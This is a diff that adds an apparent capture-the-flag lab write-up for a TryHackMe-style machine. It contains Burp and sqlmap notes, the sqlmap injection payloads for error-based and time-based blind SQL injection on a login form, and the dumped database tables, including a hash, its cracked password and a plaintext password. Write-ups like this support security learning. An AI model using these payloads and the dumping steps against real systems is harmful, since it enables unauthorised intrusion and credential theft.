@@ -311,5 +311,134 @@ gobuster dir -u http://10.10.209.216:1337/phpmyadmin/ -w /usr/share/wordlists/di
 
 
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ENUMERATING/PLAYING AROUND WITH phpmyadmin/sql database
+
+tried to log in to 10.10.194.73:1337/phpmyadmin/index.php
+
+got error message:
+mysqli_real_connect(): (HY000/1045): Access denied for user 'dd'@'localhost' (using password: YES)
+
+
+<a href="./doc/html/index.html" - might be possible to directory traversal here
+
+You can capture HTTP requests with Burp and then save them as files for SQLmap to run on
+
+FOR GOBUSTER IN FUTURE USE THE /dirb/ wordlists
+
+----
+
+navigated to the /admin_101/ directory and made a login request with BURP Suite Proxy active 
+Saved the request and ran sqlmap with it
+
+sqlmap -r req --dump
+
+log:
+
+sqlmap identified the following injection point(s) with a total of 1555 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.1
+available databases [6]:
+[*] expose
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] sys
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.1
+Database: expose
+[2 tables]
++--------+
+| user   |
+| config |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.1
+Database: expose
+Table: user
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| created  | timestamp    |
+| email    | varchar(512) |
+| id       | int          |
+| password | varchar(512) |
++----------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.1
+Database: expose
+Table: config
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+
+Database: expose
+Table: user
+[4 entries]
++--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
+| id                                   | email                                | created                              | password                             |
++--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
+| 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  |
+| hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      |
+| 1                                    | 1                                    | 1                                    | 1                                    |
+| VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 |
++--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
 
 
